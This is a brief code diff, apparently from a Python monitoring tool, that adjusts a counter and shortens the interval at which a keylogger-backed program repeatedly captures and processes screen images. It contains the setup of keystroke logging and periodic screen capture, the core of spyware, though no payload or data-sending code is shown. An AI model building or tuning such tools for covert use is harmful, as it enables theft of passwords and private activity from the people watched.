@@ -14,11 +14,11 @@ import keylog
 
 g_klog = None
 g_repscreen = None
-cmpt = 300
+cmpt = 350
 
 def init():
     global g_klog, g_repscreen
-    g_repscreen = repeatedTime.RepeatedTimer(5,process_image)
+    g_repscreen = repeatedTime.RepeatedTimer(2,process_image)
     g_klog = keylog.KeyLogger()
     startAll()
 
